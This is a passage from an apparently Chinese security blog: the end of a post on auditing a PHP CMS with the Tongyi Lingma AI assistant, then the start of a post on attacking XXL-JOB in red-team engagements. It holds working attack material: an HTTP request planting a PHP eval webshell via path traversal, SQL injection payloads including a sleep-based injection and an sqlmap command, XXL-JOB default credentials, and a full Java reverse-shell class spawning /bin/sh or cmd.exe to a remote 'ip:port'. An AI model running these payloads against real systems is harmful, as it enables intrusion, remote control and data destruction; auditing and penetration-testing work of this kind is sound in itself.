+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/template/insert.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>48</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://public</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/edit/file/article_list.html.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">file=../../shell&amp;type=php&amp;content=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>返回包提示添加成功</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/24.png" alt="image"></p>
+<p>在static目录下可以看到该上传的文件</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/25.png" alt="image"></p>
+<p>由于没有限制文件格式和内容，此处是可以上传任何格式和内容</p>
+<p>同理，我们看到update方法的构造是与上述insert方法一摸一样的，也存在多个可控参数</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/26.png" alt="image"></p>
+<p>这里直接延用上述请求包即可：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/template/update.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>public</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>46</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://public</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/index.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-gradle"><span class="keyword">file</span>=..<span class="regexp">/../</span>../ceshi.txt&amp;type=txt&amp;content=nihao</span></span><br></pre></td></tr></table></figure>
+
+<p>但注意，此处原请求type值为空，file文件后跟上后缀.html，但如果要任意文件修改，则必须指明type类型，不能为空，在file后也要写文件的全名（包括后缀）</p>
+<p>执行后结果如下：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/27.png" alt="image"></p>
+<p>原测试文件内容如下：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/28.png" alt="image"></p>
+<p>执行后文件内容如下：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/29.png" alt="image"></p>
+<p>可以看到已实现对任意文件内容的修改</p>
+</blockquote>
+<h3><span id="sql注入漏洞">SQL注入漏洞</span></h3><blockquote>
+<p>看完了几个高危，我们再来看看比较常见的SQL注入漏洞，这个项目的后台因为本身就可以实现对数据库的管理，所以后台已授权的SQL注入反而显得毫无价值了，我们仅以此为例，来看看通义灵码全面的辅助审计能力</p>
+<p>进入到广告管理模块下面,看到其调用的方法来自AD.php</p>
+<p>继续使用上述prompt：</p>
+<blockquote>
+<p>已知该代码中存在SQL注入漏洞，请你找出你能确定的漏洞，并简要分析该漏洞形成原因</p>
+</blockquote>
+<p>此处因为目标是寻找SQL注入漏洞，为了进一步缩小范围，可以直接告知它存在该漏洞，如若不存在，它会明确告知无SQL注入风险</p>
+<p>它给出的回答如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">在提供的代码中，存在多个潜在的<span class="keyword">SQL</span>注入漏洞。以下是一些确定的漏洞及其成因分析：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> index 方法中的 <span class="keyword">where</span> 条件</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">where</span>(<span class="string">&#x27;a.title&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, &quot;%&quot; . $key . &quot;%&quot;)</span><br><span class="line"></span><br><span class="line">成因分析:$key 是从用户输入的 post.key 获取的，没有进行任何过滤或转义。</span><br><span class="line">如果用户输入恶意的 <span class="keyword">SQL</span> 语句，可以直接影响查询条件，导致 <span class="keyword">SQL</span> 注入。</span><br><span class="line"></span><br><span class="line">示例攻击:用户输入 key 为 <span class="number">1</span><span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>，查询条件将变为 a.title <span class="keyword">LIKE</span> <span class="string">&#x27;%1\&#x27;</span> <span class="keyword">OR</span> \<span class="string">&#x27;1\&#x27;</span><span class="operator">=</span>\<span class="string">&#x27;1%&#x27;</span>，这将导致查询返回所有记录。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> editState 方法中的 <span class="keyword">where</span> 条件</span><br><span class="line"></span><br><span class="line">if(db(<span class="string">&#x27;ad&#x27;</span>)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">where</span>(<span class="string">&#x27;id=&#x27;</span>.$id)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">update</span>([<span class="string">&#x27;open&#x27;</span><span class="operator">=</span><span class="operator">&gt;</span>$<span class="keyword">open</span>])<span class="operator">!=</span><span class="operator">=</span><span class="literal">false</span>)&#123;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">成因分析:$id 是从用户输入的 post.id 获取的，没有进行任何过滤或转义。</span><br><span class="line">如果用户输入恶意的 <span class="keyword">SQL</span> 语句，可以直接影响查询条件，导致 <span class="keyword">SQL</span> 注入。</span><br><span class="line"></span><br><span class="line">示例攻击:用户输入 id 为 <span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>，查询条件将变为 id<span class="operator">=</span><span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>，这将导致更新所有记录。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> del 方法中的 <span class="keyword">where</span> 条件</span><br><span class="line"></span><br><span class="line">db(<span class="string">&#x27;ad&#x27;</span>)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">where</span>(<span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span><span class="operator">=</span><span class="operator">&gt;</span>input(<span class="string">&#x27;id&#x27;</span>)))<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">delete</span>();</span><br><span class="line"></span><br><span class="line">成因分析:虽然这里使用了数组形式的 <span class="keyword">where</span> 条件，但在某些情况下，如果 input(<span class="string">&#x27;id&#x27;</span>) 是一个复杂的表达式，仍然可能存在风险。</span><br><span class="line"></span><br><span class="line">最好使用参数绑定来确保安全性。</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> delall 方法中的 <span class="keyword">where</span> 条件</span><br><span class="line"></span><br><span class="line">$map[] <span class="operator">=</span><span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;in&#x27;</span>,input(<span class="string">&#x27;param.ids/a&#x27;</span>));</span><br><span class="line">db(<span class="string">&#x27;ad&#x27;</span>)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">where</span>($map)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">delete</span>();</span><br><span class="line"></span><br><span class="line">成因分析:input(<span class="string">&#x27;param.ids/a&#x27;</span>) 直接用于 <span class="keyword">IN</span> 子句，没有进行任何过滤或转义。</span><br><span class="line">如果用户输入恶意的 <span class="keyword">SQL</span> 语句，可以直接影响查询条件，导致 <span class="keyword">SQL</span> 注入。</span><br><span class="line"></span><br><span class="line">示例攻击:用户输入 ids 为 <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--，查询条件将变为 id IN (1,2,3) OR 1=1 --，这将导致删除所有记录。</span></span><br></pre></td></tr></table></figure>
+
+<p>比如说我们想聚焦到其中一个方法下面，具体对其进行研究和复现，可以使用如下prompt：</p>
+<blockquote>
+<p>请详细讨论editState 方法中的 where 条件</p>
+</blockquote>
+<p>灵码就会针对该方法进行详细的分析：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">问题分析</span><br><span class="line">用户输入直接拼接到 SQL 语句中:$id 和 $open 是从用户输入的 POST 请求中直接获取的，没有进行任何验证或转义。</span><br><span class="line"></span><br><span class="line">这种做法非常危险，因为用户可以通过构造恶意的输入来注入 SQL 代码。</span><br><span class="line"></span><br><span class="line">SQL 注入风险:如果用户输入的 id 为 1 OR 1=1，查询条件将变为 id=1 OR 1=1，这将导致更新所有记录。</span><br><span class="line"></span><br><span class="line">类似地，如果用户输入的 open 为 1; DROP TABLE ad; --，可能会导致更严重的后果。</span><br><span class="line"></span><br><span class="line">示例攻击</span><br><span class="line">假设用户发送以下 POST 请求：</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/admin/ad/editState</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-routeros"><span class="attribute">id</span>=1 <span class="keyword">OR</span> <span class="attribute">1</span>=1&amp;open=1</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros">生成的 SQL 语句将是：</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros">UPDATE `ad` <span class="built_in">SET</span> `open` = 1 WHERE id = 1 <span class="keyword">OR</span> <span class="attribute">1</span>=1</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros">这条 SQL 语句将更新表 ad 中的所有记录，而不是仅仅更新 id 为 1 的记录。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/24/AI-Code-Review-1/30.png" alt="image"></p>
+<p>对应的，我们直接去web界面的广告管理模块，找到调用editState方法的位置</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/31.png" alt="image"></p>
+<p>抓包如下，构造延迟注入：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/ad/editstate.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>25</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://public</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/ad/index.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=bs9fg0tv537v13ooprl3j6v6bb; skin=0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-routeros"><span class="attribute">id</span>=38 <span class="keyword">and</span> sleep(5)&amp;<span class="attribute">open</span>=1</span></span><br></pre></td></tr></table></figure>
+
+<p>验证发现可以延迟</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/32.png" alt="image"></p>
+<p>随后采用SQLmap进行验证存在</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py sqlmap.py -r url.txt --batch --dbms=mysql --is-dba</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/24/AI-Code-Review-1/33.png" alt="image"></p>
+</blockquote>
+<h2><span id="workspace工作空间分析">workspace工作空间分析</span></h2><blockquote>
+<p>除去对当前代码的基础分析外，灵码也可以对当前的工作空间进行整体分析：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/34.png" alt="image"></p>
+<p>进入workspace工作空间模式下，此时它可以直接读到本地项目，所以我们可以指明文件的目录位置来进行prompt提问：</p>
+<blockquote>
+<p>@workspace<br>请你分析application&#x2F;admin&#x2F;controller&#x2F;Common.php文件，判断出其中存在的安全漏洞。</p>
+</blockquote>
+<p>灵码给出的回复如下：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/35.png" alt="image"></p>
+<p>如若不指出，也可以直接提问让其在整个工作空间下寻找漏洞点：</p>
+<blockquote>
+<p>请指出该程序中可能存在的安全漏洞并加以简要分析</p>
+</blockquote>
+<p>但是这种方法的缺点就在于”随机性”太强，因为灵码的输出字符数有限，且它引用的你本地代码文件数量有限，所以极有可能出现每次结果都完全不一样的情况，如果存在漏洞点较多，它的输出就更加模糊了。</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/36.png" alt="image"></p>
+<p>这个功能的一些好处在于，它不仅能够帮助开发者更深入地理解自己的代码库，还能根据现有代码的逻辑和编程风格提供更加个性化、更加贴合实际需求的代码片段或优化建议。例如，通过分析现有的编码模式，该功能可以识别出重复的代码模板或者常见的开发习惯，进而提出改进措施来提高代码的可读性和效率。此外，对于那些希望保持项目一致性或是遵循特定设计模式的团队来说，这种定制化的反馈是非常有价值的。它还可以帮助识别潜在的bug或性能瓶颈，从而提升软件的质量与运行效率。</p>
+</blockquote>
+<h2><span id="总结及展望">总结及展望</span></h2><blockquote>
+<p>我接触灵码也已经快两年了，之前一直都是用来写运维脚本，这是我第一次尝试结合AI工具来辅助代码审计，在实际应用中，通义灵码的表现确实是超出了我的预期。它不仅帮助我快速定位了多个潜在的安全漏洞，而且还极大地提升了审计工作的效率。这一经历让我深刻认识到，AI技术在软件安全领域的应用前景广阔，尤其是在提高代码审查质量和速度方面具有显著优势。</p>
+<p>但同时，它仍然存在可提升空间：</p>
+<ul>
+<li>在理解和解释复杂业务逻辑方面的能力还有待加强，尤其是在面对非标准或高度定制化的代码时，其表现不尽如人意。</li>
+<li>在workspace模式下，有些过于僵硬，不能很好的理解我的需求</li>
+</ul>
+<p>回望过去两年灵码能力的大幅度增强，我们有理由相信它在未来会变得更加智能和高效，能够更好地应对复杂代码结构和逻辑，减少误报率，提高漏洞检测的准确性。同时，通过不断优化用户体验，灵码将能够更好地适应多样化的需求，提供更加个性化和定制化的服务，使开发者和安全研究人员能够更专注于核心问题的解决。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/AI/" rel="tag">AI</a><a class="tag-none-link" href="/tags/Code-Review/" rel="tag">Code-Review</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2025/11/24/XXL-JOB/">
+                XXL-JOB在真实攻防下的总结
+            </a>
+        </h2>
+    
+    <time>
+        Nov 24, 2025
+    </time>
+    <section class="content">
+        <h1><span id="xxl-job在真实攻防下的总结">XXL-JOB在真实攻防下的总结</span></h1><blockquote>
+<p>本文转自 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13339">Air</a> 并作补充</p>
+<p>最近在HW中经常会遇到XXL-JOB这个组件，也通过这个组件进入了不少目标单位，那就对该组件的利用进行一次总结。</p>
+</blockquote>
+<h2><span id="一-最基本的操作-计划任务命令执行">一、最基本的操作-计划任务命令执行</span></h2><blockquote>
+<p>这个操作我相信大家已经熟的不能再熟了，因为xxl-job的初始化sql语句中设定了默认密码，而且在登入之后不会提示修改默认密码，就造成了xxl-job的默认账号密码为admin&#x2F;123456。</p>
+<p>由于xxl-job本身是任务调度的系统，其可以自然执行命令。通常会反弹shell，再进行后渗透，只需要在新建命令时选择对应的脚本语言，在GLUE IDE中编辑命令，选择执行一次即可。</p>
+<p><img src="/2025/11/24/XXL-JOB/1.png" alt="image"></p>
+<p><img src="/2025/11/24/XXL-JOB/2.png" alt="image"></p>
+<p><img src="/2025/11/24/XXL-JOB/3.png" alt="image"></p>
+<p>这种方式有几个容易踩坑的点：</p>
+</blockquote>
+<h3><span id="1-选择执行命令的种类与系统不匹配">1、选择执行命令的种类与系统不匹配</span></h3><blockquote>
+<p><img src="/2025/11/24/XXL-JOB/4.png" alt="image"></p>
+<p>因为xxl-job的exector在生产环境中常常跑在docker环境下的linux下，就会造成一个惯性思维:当我们拿到一个xxl-job的往往会先使用shell去执行命令。</p>
+<p><img src="/2025/11/24/XXL-JOB/5.png" alt="image"></p>
+<p>当失败的时候就会以为是环境有问题，打不动。</p>
+<p>却不知有时xxl-job也可以跑在Windows下。这时候就可以去执行Powerhshell命令去上线。当然如果比较懒的话可以直接执行java代码来上线。无论Windows和linux都可以反弹shell。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xxl.job.service.handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStreamWriter;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reverse</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">StreamConnector</span></span><br><span class="line">    <span class="keyword">extends</span> <span class="title class_">Thread</span></span><br><span class="line">    &#123;</span><br><span class="line">        InputStream hx;</span><br><span class="line">        OutputStream il;</span><br><span class="line"></span><br><span class="line">        StreamConnector(InputStream hx, OutputStream il)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">this</span>.hx = hx;</span><br><span class="line">            <span class="built_in">this</span>.il = il;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">ar</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">BufferedWriter</span> <span class="variable">slm</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    ar = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="built_in">this</span>.hx));</span><br><span class="line">                    slm = <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(<span class="built_in">this</span>.il));</span><br><span class="line">                    <span class="type">char</span>[] buffer = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">8192</span>];</span><br><span class="line">                    <span class="type">int</span> length;</span><br><span class="line">                    <span class="keyword">while</span> ((length = ar.read(buffer, <span class="number">0</span>, buffer.length)) &gt; <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        slm.write(buffer, <span class="number">0</span>, length);</span><br><span class="line">                        slm.flush();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception localException) &#123;&#125;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (ar != <span class="literal">null</span>) &#123;</span><br><span class="line">                        ar.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (slm != <span class="literal">null</span>) &#123;</span><br><span class="line">                        slm.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception localException1) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">reverse</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        reverseConn(<span class="string">&quot;ip:port&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> </span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseConn</span><span class="params">(String ip)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ipport</span> <span class="operator">=</span> ip;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                String ShellPath;</span><br><span class="line">                <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().indexOf(<span class="string">&quot;windows&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">                    ShellPath = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ShellPath = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(ipport.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>], </span><br><span class="line">                                           Integer.parseInt(ipport.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]));</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(ShellPath);</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">StreamConnector</span>(process.getInputStream(), </span><br><span class="line">                                    socket.getOutputStream()).start();</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">StreamConnector</span>(process.getErrorStream(), </span><br><span class="line">                                    socket.getOutputStream()).start();</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">StreamConnector</span>(socket.getInputStream(), </span><br><span class="line">                                    process.getOutputStream()).start();</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
